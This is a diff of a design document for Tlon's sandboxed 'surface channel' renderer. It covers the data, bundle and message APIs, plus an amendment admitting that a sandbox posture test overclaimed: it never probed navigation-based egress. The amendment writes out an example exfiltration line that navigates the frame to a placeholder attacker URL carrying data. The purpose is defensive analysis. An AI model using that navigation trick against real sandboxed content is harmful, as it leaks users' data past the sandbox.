@@ -355,17 +355,17 @@ sessions consume:
 - **Spec:** `db.Channel.surfaceSpec` is raw JSON text; read it ONLY through
   `readSurfaceSpec(raw)` (from `@tloncorp/api`), which returns
   `{status:'absent'} | {status:'invalid'} | {status:'version-too-new',
-  version} | {status:'valid', spec}`. Renderer mapping: `invalid` → the
+version} | {status:'valid', spec}`. Renderer mapping: `invalid` → the
   "invalid definition" screen, `version-too-new` → spec-level "update to
   view". Never fall back to the chat renderer for either (§6 step 1). The
   bundle's `shellVersion` gate is separate and renderer-side, against
   `spec.bundle.shellVersion` vs the shell's `SHELL_VERSION`.
 - **Hydration:** `useSurfaceHydration({ channelId, enabled?, pageSize?,
-  maxPages? })` → a react-query result whose `data` is
+maxPages? })` → a react-query result whose `data` is
   `SurfaceHydrationState`:
   `{ status: 'absent'|'invalid'|'version-too-new'|'migration-pending'|
-  'partial'|'hydrated', spec?, specVersion?, state?, stateFull?,
-  reduction?, oldestLoadedSeq?, newestLoadedSeq? }`.
+'partial'|'hydrated', spec?, specVersion?, state?, stateFull?,
+reduction?, oldestLoadedSeq?, newestLoadedSeq? }`.
   `state` exists only when `hydrated`; `partial` is the loading screen and
   deliberately carries no state; `stateFull` drives "dashboard full".
   Live posts/deletions/spec changes re-run the fold automatically
@@ -381,7 +381,7 @@ sessions consume:
 
 - `getOrFetchBundle(spec.bundle, fetcher)` →
   `{status:'ok', content, fromCache} | {status:'unavailable', reason:
-  'fetch-failed'|'oversize'|'hash-mismatch'}` — `unavailable` is the
+'fetch-failed'|'oversize'|'hash-mismatch'}` — `unavailable` is the
   renderer's "bundle unavailable" state with a retry affordance. The
   `fetcher: (ref: SurfaceBundleRef) => Promise<string>` is supplied by
   `packages/app` (assetRef → bundle text over whatever transport);
@@ -391,7 +391,7 @@ sessions consume:
 ### Writer expectations (for the invoke path and tlon-skill)
 
 - Invokes: `sendPost({ channelId, kindTail: 'surface/event', blob:
-  JSON.stringify([entry]), content: <fallback Story> })` with the entry
+JSON.stringify([entry]), content: <fallback Story> })` with the entry
   tagged with the RENDERED `specRevision`. One surface entry per post
   (writer rule); fallback text is the writer's responsibility; success is
   confirmed by observing the post, never the poke ack.
@@ -495,7 +495,7 @@ sessions consume:
   and posts `ready` immediately — the host may send `init` any time after
   injection (before or after the bundle script runs).
 - Init contract (host→shell): `{type:'init', protocolVersion: 1, spec,
-  state, theme: 'light'|'dark', canInvoke}` — `spec` may be the full raw
+state, theme: 'light'|'dark', canInvoke}` — `spec` may be the full raw
   spec (unknown fields pass through; the shell reads
   surfaceId/specRevision/title/actions). Then `{type:'state'}` per
   reduction update, `{type:'theme'}`, `{type:'permission'}`.
@@ -517,8 +517,8 @@ sessions consume:
 
 - Node entry: `@tloncorp/surface-shell/node` →
   `runShellFixture({window, bundleSource, spec, state, theme?, canInvoke?,
-  chart?})` returning `{root, api, messages, errors(), invokes(), html(),
-  sendState(), setPermission(), setTheme(), click()}`. The DOM window is
+chart?})` returning `{root, api, messages, errors(), invokes(), html(),
+sendState(), setPermission(), setTheme(), click()}`. The DOM window is
   injected — bring your own happy-dom (`new Window()`); the shell package
   keeps happy-dom dev-only. This runs the REAL harness source; use it for
   the publish gate's smoke render.
@@ -557,19 +557,50 @@ sessions consume:
 - **D36: Web sandbox posture.** `sandbox="allow-scripts"` only (opaque
   origin; no same-origin, forms, popups, downloads, top-nav) + a
   host-injected CSP meta (`default-src 'none'; script-src 'unsafe-inline';
-  style-src 'unsafe-inline'`) as the resource gate. Outbound
+style-src 'unsafe-inline'`) as the resource gate. Outbound
   `postMessage(…, '*')` is deliberate and recorded in-code: no concrete
   targetOrigin can match an opaque origin, so `'*'` is the only working
   value; mitigations are that the host owns the iframe element (srcDoc),
   checks `event.source` against its own `contentWindow` on every inbound
   message, and sends nothing the sandbox doesn't already hold (spec,
   state, theme, permission). `</script` is escaped (`<\/script`) during
-  document assembly. Proven by a browser-level posture test
-  (`pnpm e2e:sandbox`, no ships): a hostile bundle's
-  fetch/XHR/WebSocket/image/sendBeacon/window.top/storage attempts all
-  fail, with the authoritative signal being network-level (Playwright
-  `response`/`requestfinished` listeners — `request` fires even for
-  CSP-blocked attempts, and `sendBeacon` returns true on queueing).
+  document assembly. A browser-level posture test (`pnpm e2e:sandbox`, no
+  ships) exercises this, with the authoritative signal being network-level
+  (Playwright `response`/`requestfinished` listeners — `request` fires even
+  for CSP-blocked attempts, and `sendBeacon` returns true on queueing).
+
+  **AMENDED (session 4.5, correction of record).** As originally written
+  this entry said the posture was "proven" and implied deny-all egress.
+  That was an overclaim, and the amendment is the correction of record.
+  What the posture test actually proves is exactly seven probed vectors:
+  `fetch`, `XMLHttpRequest`, `WebSocket`, image beacon, `sendBeacon`,
+  `window.top` access, and `localStorage`. Those are genuinely blocked.
+
+  **Navigation was never probed, and is not blocked.** A bundle calling
+  `location.replace('https://attacker/?data=…')` performs egress (the
+  request itself) and then runs unpinned code in the frame with no
+  injected meta CSP. No `sandbox` token restricts a frame from navigating
+  itself; CSP `default-src` governs resource fetches, not navigation;
+  `navigate-to` was dropped from CSP3 and never shipped un-flagged. The
+  gap was invisible precisely because the missing probe made it
+  invisible — a probe set that omits a vector reads as proof the vector
+  is closed. Standing rule from this: **a passing posture test may only
+  be cited for the vectors it probes**, and claims cite probe lists, not
+  suite names.
+
+  Commit `e8a40f8444`'s message ("proven posture") overclaims for the
+  same reason. Commit messages are immutable; this amendment is the
+  correction of record for it, and for the session 4 report's original
+  "fully verified" language (that report has since been revised).
+
+  The resulting posture is stated honestly in the amended plan §5 and
+  analysed in `surface-channels-f1-sandbox-egress.md`. Decision taken:
+  **Option C** — the publish gate is the primary boundary against
+  navigation egress on web now, with the Worker-realm migration as an
+  explicit M4 deliverable gating shared-group trust. See D43 for the
+  `frame-src` experiment that determines whether web additionally gets
+  origin-restricted navigation.
+
 - **D37: One message discipline for both hosts.** `createSandboxSession`
   (platform-agnostic, unit-tested) validates EVERY inbound message
   against the canonical strict schemas (widened invokes rejected, not
